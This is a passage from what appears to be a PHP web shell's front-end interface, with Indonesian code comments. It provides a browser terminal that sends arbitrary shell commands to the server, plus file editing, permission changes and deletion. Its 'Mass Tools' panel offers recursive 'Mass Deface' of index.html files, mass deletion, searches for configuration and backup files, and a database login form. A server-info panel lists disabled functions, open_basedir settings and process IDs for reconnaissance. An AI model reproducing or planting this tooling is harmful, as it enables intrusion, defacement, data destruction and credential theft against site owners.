                    <div class="modal-body"><label class="form-label">Folder Name</label><input type="text" name="folderName" class="form-control" required></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="createFolder"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-info">Create</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Edit File -->
    <div class="modal fade" id="editFileModal" tabindex="-1">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-edit me-2"></i>Edit File: <span id="editFileName"></span></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><input type="hidden" id="editFilePath" name="filePath"><textarea id="fileEditor" name="content" rows="15" class="form-control code-editor"></textarea></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="saveFile"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Save Changes</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Rename -->
    <div class="modal fade" id="renameModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-i-cursor me-2"></i>Rename</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><input type="hidden" id="renamePath" name="path"><label class="form-label">New Name</label><input type="text" id="newName" name="newName" class="form-control" required></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="rename"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-warning">Rename</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Permissions -->
    <div class="modal fade" id="permsModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-lock me-2"></i>Change Permissions</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><input type="hidden" id="permsPath" name="path"><label class="form-label">Permissions (Octal)</label><input type="text" id="perms" name="permissions" class="form-control" required></div>
                    <div class="modal-footer"><input type="hidden" name="action" value="changePermissions"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Change</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Delete -->
    <div class="modal fade" id="deleteModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title text-danger"><i class="fas fa-exclamation-triangle me-2"></i>Confirm Deletion</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <div class="modal-body"><input type="hidden" id="deletePath" name="path"><input type="hidden" id="deleteType" name="type">
                        <p>Are you sure you want to delete <strong id="deleteItemName"></strong>?</p>
                        <p class="text-danger small">This action cannot be undone.</p>
                    </div>
                    <div class="modal-footer"><input type="hidden" name="action" value="delete"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-danger">Delete</button></div>
                </form>
            </div>
        </div>
    </div>

    <!-- Terminal -->
    <div class="modal fade" id="commandModal" tabindex="-1">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-terminal me-2"></i>Terminal</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div id="terminal-output" class="terminal p-2 mb-2"></div>
                    <form id="commandForm">
                        <div class="input-group"><span class="input-group-text terminal-prompt"><?php echo htmlspecialchars(get_current_user()); ?>$</span><input type="text" name="command" class="form-control" autocomplete="off" autofocus><button type="submit" class="btn btn-primary">Run</button></div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Mass Tools Modal -->
    <div class="modal fade" id="massToolsModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-tools"></i> Mass Tools</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <ul class="nav nav-tabs" id="massToolsTabs" role="tablist">
                        <li class="nav-item" role="presentation">
                            <button class="nav-link active" id="mass-deface-tab" data-bs-toggle="tab" data-bs-target="#mass-deface" type="button" role="tab">Mass Deface</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="mass-delete-tab" data-bs-toggle="tab" data-bs-target="#mass-delete" type="button" role="tab">Mass Delete</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="find-configs-tab" data-bs-toggle="tab" data-bs-target="#find-configs" type="button" role="tab">Find Configs</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="find-backups-tab" data-bs-toggle="tab" data-bs-target="#find-backups" type="button" role="tab">Find Backups</button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="database-tab" data-bs-toggle="tab" data-bs-target="#database" type="button" role="tab">Database</button>
                        </li>
                    </ul>
                    <div class="tab-content p-3 border border-top-0" id="massToolsContent">
                        <div class="tab-pane fade show active" id="mass-deface" role="tabpanel">
                            <form method="post">
                                <input type="hidden" name="action" value="massDeface">
                                <div class="mb-3">
                                    <label class="form-label">Target Directory</label>
                                    <input type="text" class="form-control" name="targetDir" value="<?php echo htmlspecialchars($path); ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">File Name</label>
                                    <input type="text" class="form-control" name="fileName" value="index.html">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Content</label>
                                    <textarea class="form-control code-editor" name="content" rows="10" placeholder="Paste your deface code here"></textarea>
                                </div>
                                <div class="mb-3">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="recursive" id="recursiveDeface" checked>
                                        <label class="form-check-label" for="recursiveDeface">Recursive (all subdirectories)</label>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-danger">Execute Mass Deface</button>
                            </form>
                        </div>
                        <div class="tab-pane fade" id="mass-delete" role="tabpanel">
                            <form method="post">
                                <input type="hidden" name="action" value="massDelete">
                                <div class="mb-3">
                                    <label class="form-label">Target Directory</label>
                                    <input type="text" class="form-control" name="targetDir" value="<?php echo htmlspecialchars($path); ?>">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">File Name Pattern</label>
                                    <input type="text" class="form-control" name="fileName" value="*.php.bak">
                                </div>
                                <div class="mb-3">
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" name="recursive" id="recursiveDelete" checked>
                                        <label class="form-check-label" for="recursiveDelete">Recursive (all subdirectories)</label>
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-danger">Execute Mass Delete</button>
                            </form>
                        </div>
                        <div class="tab-pane fade" id="find-configs" role="tabpanel">
                            <form id="findConfigsForm">
                                <input type="hidden" name="action" value="findConfigs">
                                <div class="mb-3">
                                    <label class="form-label">Search Directory</label>
                                    <input type="text" class="form-control" name="searchDir" value="<?php echo htmlspecialchars($path); ?>">
                                </div>
                                <button type="submit" class="btn btn-primary">Find Configuration Files</button>
                            </form>
                            <pre id="findConfigsResult" class="mt-3 p-2 terminal" style="display:none; height: 250px;"></pre>
                        </div>
                        <div class="tab-pane fade" id="find-backups" role="tabpanel">
                            <form id="findBackupsForm">
                                <input type="hidden" name="action" value="findBackups">
                                <div class="mb-3">
                                    <label class="form-label">Search Directory</label>
                                    <input type="text" class="form-control" name="searchDir" value="<?php echo htmlspecialchars($path); ?>">
                                </div>
                                <button type="submit" class="btn btn-primary">Find Backup Files</button>
                            </form>
                            <pre id="findBackupsResult" class="mt-3 p-2 terminal" style="display:none; height: 250px;"></pre>
                        </div>
                        <div class="tab-pane fade" id="database" role="tabpanel">
                            <form id="dbConnectForm">
                                <input type="hidden" name="action" value="connectDb">
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label class="form-label">DB Host</label>
                                        <input type="text" class="form-control" name="db_host" value="localhost">
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label class="form-label">DB Name</label>
                                        <input type="text" class="form-control" name="db_name" placeholder="e.g., wordpress_db">
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label class="form-label">DB User</label>
                                        <input type="text" class="form-control" name="db_user" placeholder="e.g., root">
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label class="form-label">DB Password</label>
                                        <input type="password" class="form-control" name="db_pass">
                                    </div>
                                </div>
                                <button type="submit" class="btn btn-success">Connect & List Tables</button>
                            </form>
                            <pre id="dbConnectResult" class="mt-3 p-2 terminal" style="display:none; height: 250px;"></pre>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    }
                </div>
            </div>
        </div>

        <!-- Server Info Modal -->
        <div class="modal fade" id="serverInfoModal" tabindex="-1" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"><i class="fas fa-info-circle"></i> Server Information</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h5>System Information</h5>
                                <ul class="list-unstyled">
                                    <li><strong>PHP Version:</strong> <?php echo phpversion(); ?></li>
                                    <li><strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                                    <li><strong>Server Name:</strong> <?php echo $_SERVER['SERVER_NAME']; ?></li>
                                    <li><strong>Server Protocol:</strong> <?php echo $_SERVER['SERVER_PROTOCOL']; ?></li>
                                    <li><strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?></li>
                                </ul>

                                <h5 class="mt-4">PHP Configuration</h5>
                                <ul class="list-unstyled">
                                    <li><strong>Safe Mode:</strong> <?php echo ini_get('safe_mode') ? 'On' : 'Off'; ?></li>
                                    <li><strong>Disabled Functions:</strong> <span style="word-break: break-all;"><?php echo ini_get('disable_functions') ?: 'None'; ?></span></li>
                                    <li><strong>Open Basedir:</strong> <?php echo ini_get('open_basedir') ?: 'None'; ?></li>
                                    <li><strong>Memory Limit:</strong> <?php echo ini_get('memory_limit'); ?></li>
                                    <li><strong>Max Execution Time:</strong> <?php echo ini_get('max_execution_time'); ?>s</li>
                                    <li><strong>Upload Max Filesize:</strong> <?php echo ini_get('upload_max_filesize'); ?></li>
                                </ul>
                            </div>
                            <div class="col-md-6">
                                <h5>PHP Extensions</h5>
                                <div class="d-flex flex-wrap">
                                    <?php
                                    $extensions = get_loaded_extensions();
                                    natcasesort($extensions);
                                    foreach ($extensions as $ext) {
                                        echo '<span class="badge bg-secondary me-1 mb-1">' . $ext . '</span>';
                                    }
                                    ?>
                                </div>

                                <h5 class="mt-4">Database Information</h5>
                                <ul class="list-unstyled">
                                    <li><strong>MySQL Support:</strong> <?php echo extension_loaded('mysqli') ? 'Yes' : 'No'; ?></li>
                                    <li><strong>PostgreSQL Support:</strong> <?php echo extension_loaded('pgsql') ? 'Yes' : 'No'; ?></li>
                                    <li><strong>SQLite Support:</strong> <?php echo extension_loaded('sqlite3') ? 'Yes' : 'No'; ?></li>
                                </ul>

                                <h5 class="mt-4">Other Information</h5>
                                <ul class="list-unstyled">
                                    <li><strong>Current User:</strong> <?php echo get_current_user(); ?></li>
                                    <li><strong>User ID:</strong> <?php echo getmyuid(); ?></li>
                                    <li><strong>Group ID:</strong> <?php echo getmygid(); ?></li>
                                    <li><strong>Process ID:</strong> <?php echo getmypid(); ?></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                // --- Penanganan Notifikasi Toast ---
                const toastEl = document.getElementById('notificationToast');
                const toast = new bootstrap.Toast(toastEl);

                function showToast(message, type = 'success') {
                    const toastBody = toastEl.querySelector('#toast-body');
                    const toastTitle = toastEl.querySelector('#toast-title');
                    const toastIcon = toastEl.querySelector('#toast-icon');

                    toastBody.textContent = message;
                    toastEl.classList.remove('text-bg-success', 'text-bg-danger');
                    if (type === 'success') {
                        toastEl.classList.add('text-bg-success');
                        toastTitle.textContent = 'Success';
                        toastIcon.className = 'fas fa-check-circle me-2';
                    } else {
                        toastEl.classList.add('text-bg-danger');
                        toastTitle.textContent = 'Error';
                        toastIcon.className = 'fas fa-times-circle me-2';
                    }
                    toast.show();
                }

                const urlParams = new URLSearchParams(window.location.search);
                if (urlParams.has('message')) {
                    const message = urlParams.get('message');
                    const type = urlParams.has('success') ? 'success' : 'error';
                    showToast(message, type);
                    const cleanUrl = window.location.pathname + '?path=' + (urlParams.get('path') || '');
                    window.history.replaceState({}, document.title, cleanUrl);
                }

                // --- Penanganan Data Dinamis pada Modal ---
                function handleModalEvents(modalId, callback) {
                    const modalEl = document.getElementById(modalId);
                    if (modalEl) modalEl.addEventListener('show.bs.modal', callback);
                }

                handleModalEvents('viewFileModal', (event) => {
                    const button = event.relatedTarget;
                    const path = button.getAttribute('data-path');
                    const name = button.getAttribute('data-name');
                    const modal = event.currentTarget;
                    modal.querySelector('#viewFileName').textContent = name;
                    const contentArea = modal.querySelector('#viewFileContent');
                    contentArea.textContent = 'Loading file content...';

                    fetch('?filesrc=' + encodeURIComponent(path))
                        .then(response => {
                            if (!response.ok) throw new Error('File not found or not readable.');
                            return response.text();
                        })
                        .then(data => {
                            contentArea.textContent = data;
                        })
                        .catch(err => {
                            contentArea.textContent = 'Error: ' + err.message;
                            showToast('Failed to fetch file content.', 'error');
                        });
                });

                handleModalEvents('editFileModal', (event) => {
                    const button = event.relatedTarget;
                    const path = button.getAttribute('data-path');
                    const name = button.getAttribute('data-name');
                    const modal = event.currentTarget;
                    modal.querySelector('#editFileName').textContent = name;
                    modal.querySelector('#editFilePath').value = path;
                    const editor = modal.querySelector('#fileEditor');
                    editor.value = 'Loading file content...';

                    fetch('?filesrc=' + encodeURIComponent(path))
                        .then(response => {
                            if (!response.ok) throw new Error('File not found or not readable.');
                            return response.text();
                        })
                        .then(data => {
                            editor.value = data;
                        })
                        .catch(err => {
                            editor.value = 'Error: ' + err.message;
                            showToast('Failed to fetch file content.', 'error');
                        });
                });

                handleModalEvents('renameModal', (event) => {
                    const button = event.relatedTarget;
                    const modal = event.currentTarget;
                    modal.querySelector('#renamePath').value = button.getAttribute('data-path');
                    modal.querySelector('#newName').value = button.getAttribute('data-name');
                });

                handleModalEvents('permsModal', (event) => {
                    const button = event.relatedTarget;
                    const modal = event.currentTarget;
                    modal.querySelector('#permsPath').value = button.getAttribute('data-path');
                    modal.querySelector('#perms').value = button.getAttribute('data-perms');
                });

                handleModalEvents('deleteModal', (event) => {
                    const button = event.relatedTarget;
                    const modal = event.currentTarget;
                    modal.querySelector('#deletePath').value = button.getAttribute('data-path');
                    modal.querySelector('#deleteType').value = button.getAttribute('data-type');
                    modal.querySelector('#deleteItemName').textContent = button.getAttribute('data-name');
                });

                // --- Terminal Interaktif ---
                const commandForm = document.getElementById('commandForm');
                if (commandForm) {
                    commandForm.addEventListener('submit', function(e) {
                        e.preventDefault();
                        const commandInput = this.querySelector('input[name="command"]');
                        const command = commandInput.value.trim();
                        if (command === '') return;

                        const terminalOutput = document.getElementById('terminal-output');
                        const promptText = document.querySelector('.terminal-prompt').textContent;

                        terminalOutput.innerHTML += `<div><span class="text-secondary">${promptText}</span> ${command.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
                        commandInput.value = '';

                        const formData = new FormData();
                        formData.append('action', 'executeCommand');
                        formData.append('command', command);

                        fetch(window.location.href, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => {
                                if (!response.ok) {
                                    throw new Error(`HTTP error! status: ${response.status}`);
                                }
                                return response.text();
                            })
                            .then(text => {
                                try {
                                    const data = JSON.parse(text);
                                    if (data.success) {
                                        const output = data.output.replace(/</g, "&lt;").replace(/>/g, "&gt;");
                                        terminalOutput.innerHTML += `<div>${output.replace(/\n/g, '<br>')}</div>`;
                                    } else {
                                        terminalOutput.innerHTML += `<div class="text-danger">Error: ${data.output}</div>`;
                                    }
                                } catch (e) {
                                    terminalOutput.innerHTML += `<div class="text-danger">Failed to parse server response: ${e.message}</div>`;
                                    terminalOutput.innerHTML += `<div class="text-warning">Raw Response:\n${text.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</div>`;
                                }
                                terminalOutput.scrollTop = terminalOutput.scrollHeight;
                            }).catch(error => {
                                terminalOutput.innerHTML += `<div class="text-danger">Request failed: ${error}</div>`;
                                terminalOutput.scrollTop = terminalOutput.scrollHeight;
                            });
                    });
                    const commandModal = document.getElementById('commandModal');
                    commandModal.addEventListener('shown.bs.modal', () => {
                        commandModal.querySelector('input[name="command"]').focus();
                    });
                }

                // --- Mass Tools AJAX Forms ---
                function handleMassToolForms(formId, resultId) {
                    const form = document.getElementById(formId);
                    if (!form) return;

                    form.addEventListener('submit', function(e) {
                        e.preventDefault();
                        const resultArea = document.getElementById(resultId);
                        const submitButton = form.querySelector('button[type="submit"]');
                        const originalButtonText = submitButton.innerHTML;

                        resultArea.style.display = 'block';
                        resultArea.textContent = 'Processing...';
                        submitButton.disabled = true;
                        submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...';

                        const formData = new FormData(form);

                        fetch(window.location.href, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.success) {
                                    resultArea.textContent = data.output || 'Completed successfully, but no output was returned.';
                                } else {
                                    resultArea.textContent = 'Error: ' + (data.output || 'Unknown error.');
                                }
                            })
                            .catch(error => {
                                resultArea.textContent = 'Request failed: ' + error;
                            })
                            .finally(() => {
                                submitButton.disabled = false;
                                submitButton.innerHTML = originalButtonText;
                            });
                    });
                }

                handleMassToolForms('findConfigsForm', 'findConfigsResult');
                handleMassToolForms('findBackupsForm', 'findBackupsResult');
                handleMassToolForms('dbConnectForm', 'dbConnectResult');
            });
        </script>
</body>
</html>
